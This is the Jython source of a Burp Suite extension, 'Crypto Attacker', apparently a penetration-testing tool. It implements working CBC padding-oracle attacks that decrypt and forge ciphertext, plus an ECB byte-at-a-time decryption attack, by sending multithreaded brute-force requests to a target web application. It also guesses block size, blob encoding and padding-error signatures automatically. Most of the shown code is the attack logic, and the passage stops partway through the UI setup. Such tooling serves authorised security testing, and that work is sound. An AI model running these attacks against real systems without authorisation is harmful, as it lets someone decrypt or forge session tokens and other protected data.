
# Author: Rich Lundeen (@richlundeen)
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


from java import awt;
from javax import swing;
from javax.swing.table import AbstractTableModel;
import binascii, thread, time, re, urllib, base64, sys
from burp import IBurpExtender, ITab, IHttpListener, IMessageEditorController, IContextMenuFactory, IScannerCheck, IScanIssue



class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory, IScannerCheck):

    def testMode(self):
        self._CBCErrorTable.setValueAt("Response Status is", 0,0)
        self._CBCErrorTable.setValueAt("500", 0,1)
        self._BlobEncodingTable.setValueAt("ASCII Hex", 0,0) 
        self._blockSizeDropDown.setSelectedIndex(1)

    #detect error in response based on configuration 
    def isPaddingError(self, response, goodResponse=None):
        respInfo = self._helpers.analyzeResponse(response)
        strResp = self._helpers.bytesToString(response).lower()

        for checkType, value in self.cbcErrors:
            if checkType == "Response Status is" and value == str(respInfo.getStatusCode()):
                continue
            elif checkType == "Response Status is not" and value != str(respInfo.getStatusCode()):
                continue
            elif checkType == "Contains String" and value.lower() in strResp:
                continue
            elif checkType == "Not Contains String" and value.lower() not in strResp:
                continue
            elif checkType == "Contains Regex" and (re.search(value, strResp) != None):
                continue
            elif checkType == "Not Contains Regex" and (re.search(value, strResp) == None):
                continue
            elif checkType == "Response Length >" and (len(response) > value):
                continue
            elif checkType == "Response Length <" and (len(response) < value):
                continue
            else:
                return False
        return True
        
    #TODO error if try to do two attacks at once
    def cancelAttack(self, stuff):
        self.cancel = True
        return
 
    def decodeBlob(self, blob):
        for encoding in self.encoding:
            if encoding == "hex":
                blob = blob.decode("hex")
            elif encoding == "base64":
                blob = self._helpers.bytesToString(self._helpers.base64Decode(blob))
            elif encoding == "url":
                blob = self._helpers.bytesToString(self._helpers.urlDecode(blob))
            else:
                raise Exception("Unsupported format type: " + encoding)
        return [ord(ch) for ch in blob]

    def encodeBlob(self, byteblob):
        blob = "".join([chr(a) for a in byteblob])
        for encoding in self.encoding:
            if encoding == "hex":
                blob = blob.encode("hex")
            elif encoding == "base64":
                blob = self._helpers.bytesToString(self._helpers.base64Encode(blob))
            elif encoding == "url":
                blob = self._helpers.bytesToString(self._helpers.urlEncode(blob))
            else:
                raise Exception("Unsupported format type: " + encoding)
        return blob

    def getBlobIndex(self, req):
        blobstartindex = req.find(u"\u00a7") + 1
        blobendindex = blobstartindex + req[blobstartindex:].find(u"\u00a7")
        return blobstartindex,blobendindex

    #TODO make number of tries configurable and add it here
    def makeRequest(self, origReq, cryptoBlob):

        blobstartindex, blobendindex = self.getBlobIndex(origReq)
        
        newReq = origReq[:blobstartindex-1] + cryptoBlob + origReq[blobendindex +1:]
        newReq = self._helpers.stringToBytes(newReq)
        resp = self._callbacks.makeHttpRequest(self.host, self.port, self.useHTTPS, newReq)
        return resp

    def paddingDecryptAttack(self, stuff):
        self.cancel = False
        req = self._helpers.bytesToString(self._decRequestViewer.getText())
        blobstartindex, blobendindex = self.getBlobIndex(req)
        blob = req[blobstartindex : blobendindex]


        if not self.initConfig(req, blob, self.paddingDecryptOutput, "cbcattack"):
            self.paddingDecryptOutput("Unable to continue...")
            return

        output = "Settings:\n"
        output += self.prettyPrintSettings(blob)
        output += "\n\n"
        self.paddingDecryptOutput(output)
        self.decryptBodies.setSelectedComponent(self._decResponseViewer.getComponent())


        #TODO can I get rid of this?
        resp = self.makeRequest(req, blob)
        thread.start_new_thread(self.decryptMessage2, (req, resp, blob))
        return

    def paddingEncryptAttack(self, stuff):
        self.cancel = False
        req = self._helpers.bytesToString(self._encRequestViewer.getText())
        plainstartindex, plainendindex = self.getBlobIndex(req)
        blob = req[plainstartindex : plainendindex]
        

        if not self.initConfig(req, blob, self.paddingEncryptOutput, "cbcattack"):
            #TODO still need to set stuff, maybe fail if auto
            self.paddingEncryptOutput("Blob is invalid... continuing anyway")

        output = "Settings:\n"
        output += self.prettyPrintSettings(blob)
        output += "\n\n"
        #self._encResponseViewer.setText(output)
        self.paddingEncryptOutput(output)
        self.encryptBodies.setSelectedComponent(self._encResponseViewer.getComponent())

        #TODO try/catch error and exit
        if self.plaintextisAsciiHex.isSelected():
            plaintext = self.plaintextField.getText().decode("hex")
        else:
            plaintext = self.plaintextField.getText()

        #can I get rid of this TODO
        resp = self.makeRequest(req, "")
        thread.start_new_thread(self.encryptMessage, (req, resp, plaintext))
        return

    def ecbDecryptAttack(self, stuff):
        self.cancel = False
        self.initReqConfig()
        initReq = self._helpers.bytesToString(self._ecbDecRequestViewer.getText())
        blobstartindex, blobendindex = self.getBlobIndex(initReq)
        initpayload = initReq[blobstartindex : blobendindex]
        initResp = self._helpers.bytesToString(self.makeRequest(initReq, initpayload))

        resp2 = self._helpers.bytesToString(self.makeRequest(initReq, "A" * 96))
        blob = self.extractRepeatingBlock(initResp, resp2)
        self.blocksize = self.ecbGetBlocksize(blob)

        blocks = self.splitListToBlocks(blob)

        self.ecbDecBodies.setSelectedComponent(self._ecbDecResponseViewer.getComponent())
        output = "Settings:\n"
        output += self.prettyPrintSettings(initpayload)
        output += "\n\n"
        self.ecbDecryptOutput(output)

        thread.start_new_thread(self.ecbDecrypt, (initReq, initResp, blocks))


    def paddingDecryptOutput(self, outStr):
        current = self._helpers.bytesToString(self._decResponseViewer.getText())
        self._decResponseViewer.setText(current + outStr)

    def paddingEncryptOutput(self, outStr):
        current = self._helpers.bytesToString(self._encResponseViewer.getText())
        self._encResponseViewer.setText(current + outStr)

    def ecbDecryptOutput(self, outStr):
        current = self._helpers.bytesToString(self._ecbDecResponseViewer.getText())
        self._ecbDecResponseViewer.setText(current + outStr)

    def prettyPrintSettings(self, blob):
        out =  "Host: " + self.host + "\n"
        out += "Port: " + str(self.port) + "\n"
        out += "SSL: " + repr(self.useHTTPS) + "\n"
        out += "Threads: " + self.threadLimit.getText() + "\n"
        out += "Block size: " + str(self.blocksize) + "\n"
        out += "Initial Blob: " + blob
        return out

   #updates the IV based on the found intermediate blocks
    def _updateIV(self, dec_byte):
        iv_block = [0x02 for i in range(0,self.blocksize)]
        i = self.blocksize - 1
        for inter in self._intermediate:
            iv_block[i] = inter ^ (self.blocksize - dec_byte + 1)
            i -=1
        return iv_block
        
    def splitListToBlocks(self, blob):
        blocks = []
        tblock = []
        for i in range(0, len(blob)):
            tblock.append(blob[i])
            if len(tblock) % self.blocksize == 0:
                blocks.append(tblock)
                tblock = []
        return blocks

    def getRepBlockCount(self, blocks):
        for block in blocks:
            c = blocks.count(block)
            if c > 1:
                return c

    def ecbDecrypt(self, initRequest, initResponse, blocks, plaintextlen=96):
        #by here I should have all config values (e.g. blocksize, etc.)
        numRepBlocks = self.getRepBlockCount(blocks)

        #send one less byte until I align with a block
        for i in range(plaintextlen-1, plaintextlen-33, -1):
            resp = self._helpers.bytesToString(self.makeRequest(initRequest, "A" * i))
            blob = self.extractRepeatingBlock(initResponse, resp)
            nblocks = self.splitListToBlocks(blob)
            c = self.getRepBlockCount(nblocks)

            if c < numRepBlocks:
                plaintextlen = i + 1
                break
            blocks = nblocks[:]

        #get lastRepeatedBlockIndex from blocks
        lastRepeatedBlockIndex = None
        blocksToDecrypt = []
        for i in range (0, len(blocks)):
            lastIndex = len(blocks)- 1 - blocks[::-1].index(blocks[i])
            #if we are at our repeater block
            if i != lastIndex:
                lastRepeatedBlockIndex = lastIndex
            else:
                blocksToDecrypt.append((i, blocks[i][:]))

        #for each blockToDecrypt in blocksToDecrypt
        self._ecbBlockPlaintext = ""
        self._threadLimit = int(self.threadLimit.getText())
        self._threadLimit_lock = thread.allocate_lock()
        
        
        reqlen = plaintextlen

        for block in range(lastRepeatedBlockIndex+1, len(blocks)):
            for byte in range(0, self.blocksize):
                if self.cancel:
                    break

                tblocks = blocks[:]
                reqlen -= 1
                #build request with one less byte
                resp = self._helpers.bytesToString(self.makeRequest(initRequest, "A" * reqlen))
                blob = self.extractRepeatingBlock(initResponse, resp)
                nblocks = self.splitListToBlocks(blob)
                #TODO this could be sped up with freq analysis

                self._ecbByteDecrypted = False
                for i in range(0,256):
                    while self._threadLimit <= 0:
                            time.sleep(.1)
                    if self._ecbByteDecrypted:
                        break
                    self._threadLimit_lock.acquire()
                    self._threadLimit -= 1
                    self._threadLimit_lock.release()

                    #TODO url encode with helpers doesn't work - bug with Java burp helper
                    #payload = self._helpers.urlEncode("A" * (plaintextlen - 1) + chr(i))
                    payload = urllib.quote("A" * reqlen + self._ecbBlockPlaintext + chr(i))
                    thread.start_new_thread(self.asyncECBReq, (initRequest[:], initResponse[:], payload[:], nblocks[:], lastRepeatedBlockIndex, i))

                #wait for all threads to return
                while self._threadLimit != int(self.threadLimit.getText()):
                    time.sleep(.1)
        self.ecbDecryptOutput("\n\nDone")

        return


    def decryptMessage2(self, initRequest, initResponse, blob):
        self.paddingDecryptOutput("Beginning Attack...\n\n")
        
        blob = self.decodeBlob(blob)

        if self.noIV:
            blob = [0] * self.blocksize + blob[:]

        numblocks = len(blob)/self.blocksize

        plaintext = []
        for i in range(0, numblocks-1):
            plaintext.append([0] * self.blocksize)

        encryptedBlob = []
        for block in range(0, numblocks):
            encryptedBlob.append(blob[block*self.blocksize:(block +1)* self.blocksize])

        for block in range(len(plaintext), 0, -1):

            self.intermediate = [0 for i in range(0,self.blocksize)]
            self._threadLimit = int(self.threadLimit.getText())
            self._threadLimit_lock = thread.allocate_lock()

            for bytenum in range(self.blocksize-1, -1, -1):
                if self.cancel:
                    break
                self.paddingDecryptOutput(".")
                iv_block = self._encUpdateIV(self.intermediate, self.blocksize - bytenum)
                self._foundIntermediate = False

                #1/256
                for retry in range(0,2):
                    for i in range(0,256):

                        #TODO shortcut for the last block - take advantage of the padded bytes 

                        while self._threadLimit <= 0:
                            time.sleep(.1)
                        if self._foundIntermediate:
                            break

                        self._threadLimit_lock.acquire()
                        self._threadLimit -= 1
                        self._threadLimit_lock.release()

                        iv_block[bytenum] = i
                        blob = self.encodeBlob(iv_block[:] + encryptedBlob[block][:])

                        thread.start_new_thread(self.asyncReq, (initRequest, iv_block[:], encryptedBlob[block][:], initResponse, bytenum, i))

                    #wait for all threads to return
                    while self._threadLimit != int(self.threadLimit.getText()):
                        time.sleep(.1)

                    if not self._foundIntermediate:
                        if retry == 0:
                            #this might look kludgy, but seems to take care of cases that occur about ~1/256th of the time
                            iv_block[bytenum-1] ^= 0x0f
                        else:
                            iv_block[bytenum] = 0
                            errorBlob = self.encodeBlob(iv_block[:] + encryptedBlob[block][:])
                            self.paddingDecryptOutput("ERROR: Unable to decrypt byte " + str(bytenum) + "\n\n")
                            self.paddingDecryptOutput("Blob: " + errorBlob + "\n\n")
                            raise Exception("Unable to decrypt byte")
                    else:
                        break

            #use the self.intermediate block to update the iv to our desired plaintext
            tmp = []
            for i in range(0,self.blocksize):
                plaintext[block-1][i] = chr(self.intermediate[i] ^ encryptedBlob[block-1][i])

        fBlob = "".join(["".join(block) for block in plaintext])

        self.paddingDecryptOutput("\n\nPlaintext (hex): " + fBlob.encode("hex") + "\n")
        self.paddingDecryptOutput("Plaintext: " + repr(fBlob) + "\n")


    
    def pkcs7_pad(self, mstr):
        padbytes = self.blocksize - (len(mstr) % self.blocksize)
        if padbytes == 0:
            padbytes = self.blocksize
        return mstr + chr(padbytes) * padbytes


    #splits ciphertext into a list of blocks
    def split_toblocks(self, mstr):
        datasplit = []
        elem = ""
        for i in range(0,len(mstr)):
            elem += mstr[i]
            if len(elem) % self.blocksize == 0:
                datasplit.append(elem)
                elem = ""
        return datasplit

    #this may work for decryption to, try to combine later TODO
    def _encUpdateIV(self, intermediate, padding):
        iv = []
        for i in range(0, self.blocksize):
            iv.append(intermediate[i] ^ padding)
        return iv



    def encryptMessage(self, initRequest, initResponse, plaintext): 
        self.paddingEncryptOutput("Beginning Attack...\n\n")

        plaintext = self.split_toblocks(self.pkcs7_pad(plaintext))

        encryptedBlob = [] 
        for i in range(0, len(plaintext) + 1):
            encryptedBlob.append([0x00 for i in range(0,self.blocksize)])

        for block in range(len(plaintext)-1, -1, -1):

            self.intermediate = [0 for i in range(0,self.blocksize)]
            self._threadLimit = int(self.threadLimit.getText())
            self._threadLimit_lock = thread.allocate_lock()

            for bytenum in range(self.blocksize-1, -1, -1):
                if self.cancel:
                    break
                self.paddingEncryptOutput(".")
                iv_block = self._encUpdateIV(self.intermediate, self.blocksize - bytenum)
                self._foundIntermediate = False

                for retry in range(0,2):
                    for i in range(0,256):
                        while self._threadLimit <= 0:
                            time.sleep(.1)
                        if self._foundIntermediate:
                            break

                        self._threadLimit_lock.acquire()
                        self._threadLimit -= 1
                        self._threadLimit_lock.release()

                        iv_block[bytenum] = i
                        blob = self.encodeBlob(iv_block[:] + encryptedBlob[block+1][:])

                        thread.start_new_thread(self.asyncReq, (initRequest, iv_block[:], encryptedBlob[block+1][:], initResponse, bytenum, i))

                    #wait for all threads to return
                    while self._threadLimit != int(self.threadLimit.getText()):
                        time.sleep(.1)

                    if not self._foundIntermediate:
                        if retry == 0:
                            #this might look kludgy, but seems to take care of cases that occur about ~1/256th of the time
                            iv_block[bytenum-1] ^= 0x0f
                        else:
                            iv_block[bytenum] = 0
                            errorBlob = self.encodeBlob(iv_block[:] + encryptedBlob[block][:])
                            self.paddingEncryptOutput("ERROR: Unable to decrypt byte " + str(bytenum) + "\n\n")
                            self.paddingEncryptOutput("Blob: " + errorBlob + "\n\n")
                            raise Exception("Unable to decrypt byte")
                    else:
                        break

            #use the self.intermediate block to update the iv to our desired plaintext
            tmp = []
            for i in range(0,self.blocksize):
                encryptedBlob[block][i] = self.intermediate[i] ^ ord(plaintext[block][i])

        fBlob = "".join([self.encodeBlob(block[:]) for block in encryptedBlob])
        self.paddingEncryptOutput("\nFinal Blob: " + fBlob)



    def asyncECBReq(self, initRequest, initResponse, payload, nblocks, lastRepeatedBlockIndex, i):
        resp = self._helpers.bytesToString(self.makeRequest(initRequest, payload ))
        self._threadLimit_lock.acquire()
        blob = self.extractRepeatingBlock(initResponse[:], resp[:])
        tblocks = self.splitListToBlocks(blob)
        
        if nblocks[lastRepeatedBlockIndex] == tblocks[lastRepeatedBlockIndex]:
            self.ecbDecryptOutput(chr(i))
            self._ecbBlockPlaintext += chr(i)
            self._ecbByteDecrypted = True

        self._threadLimit += 1
        self._threadLimit_lock.release()
        return

    def asyncReq(self, initRequest, iv_block, c_block, initResponse, byte_val, i):
        blob = self.encodeBlob(iv_block + c_block)
        tResp = self.makeRequest(initRequest, blob)
        self._threadLimit_lock.acquire()
        if not self.isPaddingError(tResp, initResponse):
            #if this is the end of the block there could be issues (e.g. \x02\x02 would have valid padding)
            if byte_val == self.blocksize-1:
                iv_block[byte_val-1] ^= 1
                blob2 = self.encodeBlob(iv_block + c_block)
                tResp2 = self.makeRequest(initRequest, blob)
                if self.isPaddingError(tResp, initResponse):
                    self._threadLimit += 1
                    self._threadLimit_lock.release()
                    return
            self._foundIntermediate = True
            self.intermediate[byte_val] = (self.blocksize - byte_val) ^ i
        self._threadLimit += 1
        self._threadLimit_lock.release()

    def UICheckTableConfigError(self, tableobj, numEncodings):
        for i in range(1, numEncodings):
            if tableobj.getValueAt(i,0) == "Auto (heuristics)":
                return False
        return True

    def guessEncoding(self, blob):
        self.encoding = []
        try:
            blob.decode("hex")
            self.encoding.append("hex")
        except TypeError:
            pass
        if len(self.encoding) == 0:
            b64regex = "^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$"
            urlregex = "^(%[\w]{2})+$"
            if re.match(b64regex, blob):
                if "=" in blob or "/" in blob or (re.match(".*[A-Z].*", blob) and re.match(".*[a-z].*", blob)):
                    self.encoding.append("base64")
            elif re.match(urlregex, blob):
                self.encoding.append("url")
            else:
                return False
        return True


    def initReqConfig(self):
        if self.host == None:
            self.host = self._hostOption.getText()
            if self.host == "":
                errorOutput("Error: Unable to get port")
                return False
        if self.port == None:
            try:
                self.port = int(self._miscPort.getText())
            except ValueError:
                errorOutput("Error: Unable to get port")
                return False
        if self.useHTTPS == None:
            self.useHTTPS = self.useHTTPSbutton.isSelected()

    #mode is "cbcscan", "cbcattack"
    #TODO output on decrypter doesn't work
    def initConfig(self, req, blob, errorOutput=lambda x:None, mode="cbcattack"):

        self.initReqConfig()

        if req.count(u"\u00a7") != 2 and mode == "cbcattack":
            errorOutput("Error: needs 2 markers")

        #get encoding if set to auto, check for errors
        numEncodings = self._BlobEncodingTable.getRowCount()

        if not self.UICheckTableConfigError(self._BlobEncodingTable, numEncodings):
            errorOutput("Error: cannot select auto encodings as part of a chain")
            return False
        
        self.encoding = []
        if numEncodings < 1 or (numEncodings == 1 and self._BlobEncodingTable.getValueAt(0,0) == "Auto (heuristics)"):
            if not self.guessEncoding(blob):
                errorOutput("Error: Encoding not set and could not be guessed\n")
                return False
            else:
                errorOutput("Encoding is guessed as: " + self.encoding[0] + "\n")
        else:
            for i in range(0, numEncodings):
                if self._BlobEncodingTable.getValueAt(i,0) == "ASCII Hex":
                    self.encoding.append("hex")
                elif self._BlobEncodingTable.getValueAt(i,0) == "Base64":
                    self.encoding.append("base64")
                elif self._BlobEncodingTable.getValueAt(i,0) == "URL Encoding":
                    self.encoding.append("url")

        blob = self.decodeBlob(blob)

        #sanity check, blocklength is tested for more extensively/specifically below
        if len(blob) % 8 != 0:
            errorOutput("Error: Invalid blob length")
            return False

        #get CBC error conditions here
        numErrorChecks = self._CBCErrorTable.getRowCount()
        if not self.UICheckTableConfigError(self._CBCErrorTable, numErrorChecks):
            errorOutput("Error: cannot set Auto Error checking twice in one table")
            return False
        self.cbcErrors = []

        if self._CBCErrorTable.getValueAt(0,0) == "Auto (heuristics)" and "cbc" in mode:
            if not self.guessCBCErrorCheck(req, blob, errorOutput):
                errorOutput("Error: cannot auto detect padding error")
                return False
        else:
            numErrorChecks = self._CBCErrorTable.getRowCount()
            for error in range(0, numErrorChecks):
                checkType = self._CBCErrorTable.getValueAt(i,0)
                checkValue = self._CBCErrorTable.getValueAt(i,1)
                self.cbcErrors.append((checkType, checkValue))
                if checkValue == "" or checkType == "":
                    errorOutput("Error: table value not set")
                    return False

        #CBC blocklength check
        #will only detect 128 and 64 bits, Rizzo algorithm
        if self._blockSizeDropDown.getSelectedItem() == "Auto (heuristics)":
            self.blocksize = 1
            if len(blob) % 16 == 8:
                self.blocksize = 8
            elif len(blob) >= 16:
                tBlob = self.encodeBlob([0x2]*8 + blob[-16:])
                tResp = self.makeRequest(req, tBlob)
                if not self.isPaddingError(tResp):
                    self.blocksize = 8
                else:
                    self.blocksize = 16
            errorOutput("Guessing block size of: " + str(self.blocksize) + "\n")
        else:
            self.blocksize = int(self._blockSizeDropDown.getSelectedItem())/8


        if len(blob) % (self.blocksize) != 0:
            errorOutput("Error: Invalid blob length")
            return False

        #TODO make sure bytes are relatively random, if scanner then fail else warn
        return True
     

    #uses three requests to guess what errors look like
    #TODO threading
    def guessCBCErrorCheck(self, req, blob, output=lambda x:None):

        goodResp = self.makeRequest(req, self.encodeBlob(blob))
        #flip the last byte, see if it's an error
        tblob = blob[:]
        #33 is bigger than the biggest blocksize, and should produce a padding error
        tblob[-1] ^= 33
        padErrorResp = self.makeRequest(req, self.encodeBlob(tblob))
        tblob = blob[:]
        #attempt to mess up the block but not cause a padding error
        if len(blob) > 32:
            tblob[-33] ^= 33
        else:
            tblob[0] ^= 1
        controlResp = self.makeRequest(req, self.encodeBlob(tblob))

        goodStatus = self._helpers.analyzeResponse(goodResp).getStatusCode()
        padErrorStatus = self._helpers.analyzeResponse(padErrorResp).getStatusCode()
        controlStatus = self._helpers.analyzeResponse(controlResp).getStatusCode()

        if padErrorStatus != goodStatus and padErrorStatus != controlStatus:
            #status is padErrorStatus
            self.cbcErrors.append(("Response Status is", str(padErrorStatus)))
            output("Guessed Padding Error: status == " + str(padErrorStatus) + "\n")
            return True

        keywords = ["error", "padding error"]

        for word in keywords:
            if word in padErrorResp.lower() and word not in goodResp.lower() and word not in controlResp.lower():
                self.cbcErrors.append(("Contains String", word))    
                output("Guessed Padding Error: contains string == " + word + "\n")
                return True

        #TODO play with others - response length a lot bigger or a lot smaller? etc.
        return False




    def createMenuItems(self, invocation):
        menu = []

        # Which part of the interface the user selects
        ctx = invocation.getInvocationContext()

        # Message Viewer Req will show menu item if selected by the user
        if ctx == 0 or ctx == 2:
            menu.append(swing.JMenuItem("Crypto Attacker", None, actionPerformed=lambda x, inv=invocation: self.sendToTab(inv)))

        return menu if menu else None

    def sendToTab(self, invocation):

        try:
            #TODO TODO Remove
            #self.testMode()

            parent = self.getUiComponent().getParent()
            parent.setSelectedComponent(self.getUiComponent())
            self._mainPane.setSelectedComponent(self._optionsScrollPanel)

            invMessage = invocation.getSelectedMessages()
            message = invMessage[0]
            service = message.getHttpService()
            self._hostOption.setText(service.getHost())
            self._miscPort.setText(str(service.getPort()))
            if service.getProtocol() == "https":
                self.useHTTPSbutton.setSelected(True)



            reqInfo = self._helpers.analyzeRequest(message)
            reqUrl = str(reqInfo.getUrl())
            reqBody = message.getRequest()
            self._decRequestViewer.setText(reqBody)
            self._encRequestViewer.setText(reqBody)
            self._ecbDecRequestViewer.setText(reqBody)

        except:
            print 'Failed to add data to scan tab.'

    def addUI(self):

        #Simple config additions can just be added to the UI here
        self.blockSizeOptions               = ["Auto (heuristics)", "256", "192", "128", "64"]
        self.encodingTypeOptions            = ["Auto (heuristics)", "ASCII Hex", "Base64", "URL Encoding"]
        self.paddingErrorDetectionOptions   = ["Auto (heuristics)", "Response Status is", "Response Status is not", "Contains String", "Not Contains String", "Contains Regex", 
                                               "Not Contains Regex", "Response Length > ", "Response Length <"]

        ### main split pane ###
        self._mainPane = swing.JTabbedPane()

        #should mostly be able to copy this https://www.codewatch.org/blog/?p=402

        #Create Elements
        self._miscTextHeading = swing.JLabel()
        self._miscTextHeading.setText("<html><h2>General</h2></html>")
        self._hostOptionText = swing.JLabel()
        self._hostOptionText.setText("Host:")
        self._hostOption = swing.JTextField()
        self._miscPortText = swing.JLabel()
        self._miscPortText.setText("Port:")
        self._miscPort = swing.JTextField()
        self.useHTTPSbutton = swing.JCheckBox('Use HTTPS')
        self.noIV = swing.JCheckBox('no IV (CBC Decrypt only)')
        self.noIV.setSelected(True)
        self._threadLimitText = swing.JLabel()
        self._threadLimitText.setText("Threads:")
        self.threadLimit = swing.JTextField()
        self.threadLimit.setText("30")

        self._blockSizeText = swing.JLabel()
        self._blockSizeText.setText("Blocksize:")
        self._blockSizeDropDown = swing.JComboBox(self.blockSizeOptions)
        self._jSeparator1 = swing.JSeparator()

        self._BlobEncodeHeading  = swing.JLabel()
        self._BlobEncodeHeading.setText("<html><h2>Blob Encoding</h2><p>Configure the type of blob encoding. Multiple Options are stacked (e.g. first ascii then base64)</p></html>")
        self._BlobEncodingTable = swing.JTable(swing.table.DefaultTableModel([["Auto (heuristics)"]], ["Blob Encoding"]))
        ecodingOptionsCombo = swing.JComboBox(self.encodingTypeOptions)
        self._BlobEncodingTable.getColumnModel().getColumn(0).setCellEditor(swing.DefaultCellEditor(ecodingOptionsCombo))
        self._blobTablePane = swing.JScrollPane(self._BlobEncodingTable)
        addEncodingButton = swing.JButton('Add Row', actionPerformed=self.UIAddEncodingRow)
        delEncodingButton = swing.JButton('Delete Row', actionPerformed=self.UIDelEncodingRow)
        self._jSeparator2 = swing.JSeparator()

        self._ErrorDetectionHeading  = swing.JLabel()
        self._ErrorDetectionHeading.setText("<html><h2>CBC Padding Oracle Error Detection</h2><p>The Following are ANDed - if true, the response is considered a padding error</p></html>")
        self._CBCErrorTable = swing.JTable(swing.table.DefaultTableModel([["Auto (heuristics)", ""]], ["Padding Error Detection", "Value"]))
        CBCErrorOptionsCombo = swing.JComboBox(self.paddingErrorDetectionOptions)
        self._CBCErrorTable.getColumnModel().getColumn(0).setCellEditor(swing.DefaultCellEditor(CBCErrorOptionsCombo))
        self._CBCErrorTablePane = swing.JScrollPane(self._CBCErrorTable)
        addPadErrorButton = swing.JButton('Add Row', actionPerformed=self.UIAddPaddingRow)
        delPadErrorButton = swing.JButton('Delete Row', actionPerformed=self.UIDelPaddingRow)

        _jSeparator3 = swing.JSeparator()



        _activeScanText = swing.JLabel()
        _activeScanText.setText("<html><h2>Active Scan Checks</h2><p>This will check for Crypto attacks using heuristics at all active scan insertion points</p></html>")

        self.activeScanPaddingOracle = swing.JCheckBox('Padding Oracle')
        self.activeScanPaddingOracle.setSelected(True)
        self.activeScanECB = swing.JCheckBox('ECB')
        self.activeScanECB.setSelected(True)


        #Position elements - x,y,width,height
        self._miscTextHeading.setBounds(13,10,800,40)
        self._hostOptionText.setBounds(15, 50, 60, 30)
        self._hostOption.setBounds(95, 50, 250, 30)
        self._miscPortText.setBounds(15, 95, 60, 30)
        self._miscPort.setBounds(95, 95, 75, 30)
        self.useHTTPSbutton.setBounds(200, 95, 125, 30)
        self.noIV.setBounds(200, 140, 225, 30)
        self._threadLimitText.setBounds(15, 140, 60, 30)
        self.threadLimit.setBounds(95, 140, 75, 30)
        self._blockSizeText.setBounds(15, 185, 85, 30)
        self._blockSizeDropDown.setBounds(95, 185, 160, 30)
        self._jSeparator1.setBounds(15, 235, 1200, 5)
        self._BlobEncodeHeading.setBounds(13,235,800,80)
        self._blobTablePane.setBounds(15, 325, 500, 100)
        addEncodingButton.setBounds(540, 330, 95, 30)
        delEncodingButton.setBounds(540, 365, 95, 30)
        self._jSeparator2.setBounds(15, 455, 1200, 5)
        self._ErrorDetectionHeading.setBounds(13,455,800,80)
        self._CBCErrorTablePane.setBounds(15, 545, 600, 150)
        addPadErrorButton.setBounds(640, 550, 95, 30)
        delPadErrorButton.setBounds(640, 585, 95, 30)
        _jSeparator3.setBounds(15, 720, 1200, 5)
        _activeScanText.setBounds(13, 720, 800, 80)
        self.activeScanPaddingOracle.setBounds(15, 820, 150, 30)
        self.activeScanECB.setBounds(180, 820, 200, 30)


        self._optionsTab = swing.JPanel()
        self._optionsTab.setLayout(None)

        self._optionsTab.setPreferredSize(awt.Dimension(1000,1000))
        self._optionsTab.add(self._miscTextHeading)
        self._optionsTab.add(self._hostOption)
        self._optionsTab.add(self._hostOptionText)
        self._optionsTab.add(self._miscPortText)
        self._optionsTab.add(self._miscPort)
        self._optionsTab.add(self.useHTTPSbutton)
        self._optionsTab.add(self.noIV)
        self._optionsTab.add(self._threadLimitText)
        self._optionsTab.add(self.threadLimit)
        self._optionsTab.add(self._blockSizeText)
        self._optionsTab.add(self._blockSizeDropDown)
        self._optionsTab.add(self._jSeparator1)
        self._optionsTab.add(self._BlobEncodeHeading)
        self._optionsTab.add(self._blobTablePane)
        self._optionsTab.add(addEncodingButton)
        self._optionsTab.add(delEncodingButton)
        self._optionsTab.add(self._jSeparator2)
        self._optionsTab.add(self._ErrorDetectionHeading)
        self._optionsTab.add(self._CBCErrorTablePane)
        self._optionsTab.add(addPadErrorButton)
        self._optionsTab.add(delPadErrorButton)
        self._optionsTab.add(_jSeparator3)
        self._optionsTab.add(_activeScanText)
        self._optionsTab.add(self.activeScanPaddingOracle)
        self._optionsTab.add(self.activeScanECB)

        self._optionsScrollPanel = swing.JScrollPane(self._optionsTab)
        self._optionsScrollPanel.setViewportView(self._optionsTab)
        self._optionsScrollPanel.setPreferredSize(awt.Dimension(999,999))

        #self._mainPane.addTab("Config", self._optionsTab)
        self._mainPane.addTab("Config", self._optionsScrollPanel)     


        ### Decrypt Padding Oracle Tab ###
        self._decryptTab = swing.JSplitPane(swing.JSplitPane.VERTICAL_SPLIT)

        decryptButtons = swing.JPanel()
        decryptButtons.setLayout(awt.FlowLayout(awt.FlowLayout.LEADING, 5, 10))
        self._decryptTab.setLeftComponent(decryptButtons)
        decryptAddMarkButton = swing.JButton(u"Add \u00a7", actionPerformed=self.UICbcDecAddPressed)
        decryptClearMarksButton = swing.JButton(u'Clear \u00a7', actionPerformed=self.UICbcDecClearPressed)
        decryptAttackButton = swing.JButton("Attack", actionPerformed=self.paddingDecryptAttack)
        cancelAttackButton = swing.JButton("Stop", actionPerformed=self.cancelAttack)
    

        decryptButtons.add(decryptAddMarkButton)
        decryptButtons.add(decryptClearMarksButton)
        decryptButtons.add(decryptAttackButton)
        decryptButtons.add(cancelAttackButton)


        self.decryptBodies = swing.JTabbedPane()
        self._decRequestViewer = self._callbacks.createTextEditor()
        self._decResponseViewer = self._callbacks.createTextEditor()
        self._decResponseViewer.setEditable(False)
        self.decryptBodies.addTab("Request", self._decRequestViewer.getComponent())

        #output should include status, etc.
        self.decryptBodies.addTab("Output", self._decResponseViewer.getComponent())
        self._decryptTab.setRightComponent(self.decryptBodies)



        self._mainPane.addTab("CBC Decrypt", self._decryptTab)


        ### Encrypt Padding Oracle Tab ###
        self._encryptTab = swing.JSplitPane(swing.JSplitPane.VERTICAL_SPLIT)

        encryptButtons = swing.JPanel()
        toprow = swing.JPanel()
        botrow = swing.JPanel()
        encryptButtons.setLayout(swing.BoxLayout(encryptButtons, swing.BoxLayout.Y_AXIS))

        toprow.setLayout(awt.FlowLayout(awt.FlowLayout.LEADING, 5, 10))
        botrow.setLayout(awt.FlowLayout(awt.FlowLayout.LEADING, 5, 10))
        
        
        encryptAddMarkButton = swing.JButton(u"Add \u00a7", actionPerformed=self.UICbcEncAddPressed)
        encryptClearMarksButton = swing.JButton(u'Clear \u00a7', actionPerformed=self.UICbcEncClearPressed)
